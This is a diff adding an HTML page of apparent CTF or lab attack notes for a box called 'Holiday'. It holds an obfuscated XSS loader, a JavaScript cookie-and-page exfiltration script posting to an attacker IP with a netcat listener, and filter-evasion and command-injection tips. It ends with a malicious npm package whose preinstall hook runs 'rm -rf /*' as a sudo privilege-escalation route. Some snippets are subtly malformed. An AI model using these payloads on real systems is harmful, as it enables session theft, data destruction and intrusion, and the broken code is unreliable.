@@ -1,0 +1,80 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Holiday - SQL Complex XSS ComInj NPM</title>
+</head><body>Tools having issues running? Check for User Agent filtering. <br/>
+sqlmap --threads &lt;#&gt;&#09;&#09;&#09;#speeds things up greatly for say OR based blinds or other <br/>
+<br/>
+webgun (build XSS payloads)<br/>
+OWASP xss evasion<br/>
+<br/>
+eval(String.fromCharCode(#,#,#,#,#,#,#.....))&#09;#for evasion<br/>
+<br/>
+Filtering note: &amp;amp is different from &amp;lt;. Seeing &amp;lt; or &amp;gt; is a good sign! that evasion is working to a degree.<br/>
+<br/>
+Http-only cookies is on! so you CANNOT just do an 'easy' cookie grabber. <br/>
+Here is this payload instead:<br/>
+<br/>
+eval(String.fromCharCode(document.write('&lt;script src="http://10.10.10.14.8/holiday.js"&gt;&lt;/script&gt;');))<br/>
+<br/>
+python:<br/>
+ord("A") for single characters will turn it into ordinal char codes<br/>
+Only single letters at a time<br/>
+<br/>
+Holiday.js (Cookie catcher / Cookie grabber from HTTP-only cookie)<br/>
+#idea: request to pull the page and a second request to send the page to us<br/>
+<br/>
+var req1 = new XMLHttpRequest();<br/>
+var req2 = new XMLHttpRequest();<br/>
+req1.open('GET','http://localhost:8000/vac/073ada6c-dcce-4a45-9c8c-da3c30de15f3', false);<br/>
+req1.send();<br/>
+var response = req1.responseText;<br/>
+var params = "cookie=" + encodeURIComponent(response);<br/>
+req2.open('POST', 'http://10.10.14.8:8000/, true);<br/>
+req2.setRequestHeader('Content-type', 'application/x-ww-form-urlencoded');<br/>
+req2.send(params);<br/>
+<br/>
+serv 80 (from the XSS payload)<br/>
+nc -lvvnp 8000 (from our js payload) to grab the cookie<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+python:<br/>
+import urllib<br/>
+print urllib.unquote(""" DATA """) #this will unencode the HTTP response<br/>
+<br/>
+<br/>
+<br/>
+Fuzzing an "export files" function<br/>
+This particular function is calling GET /admin/export?table=notes<br/>
+So it looks like it's grabbing data from the database. Can we arbitrarily grab anything else? Command injection? Is it actually a database or is it passing a shell command?<br/>
+<br/>
+IP address can be encoded in hex! This can bypass filtering on "." in ip addresses. Many tools including ping and wget will still resolve hex encoded ip adresses<br/>
+<br/>
+Exploit sudo npm<br/>
+npm install capability is dangerous. Example at joaojeronimo/rimrafall<br/>
+Sometimes requires sudo npm -i &lt;package&gt; --unsafe<br/>
+<br/>
+index.js: <br/>
+module.exports = "npm install could be dangerous.";<br/>
+<br/>
+package.json:<br/>
+{<br/>
+&nbsp; "name": "rimrafall",<br/>
+&nbsp; "version": "1.0.0",<br/>
+&nbsp; "description": "rm -rf /* #DO NOT INSTALL THIS",<br/>
+&nbsp; "main": "index.js",<br/>
+&nbsp; "scripts": {<br/>
+&nbsp; &nbsp; "preinstall": <b>"rm -rf /* / *</b>"<br/>
+&nbsp; },<br/>
+&nbsp; "keywords": [<br/>
+&nbsp; &nbsp; "rimraf",<br/>
+&nbsp; &nbsp; "rmrf",<br/>
+&nbsp; ]<br/>
+&nbsp; "author": "Joao Jeronimo",<br/>
+&nbsp; "license": "ISC"<br/>
+}<br/>
+<br/>
+The preinstall key allows arbitrary shell commands: ie bash /tmp/shell</body></html>
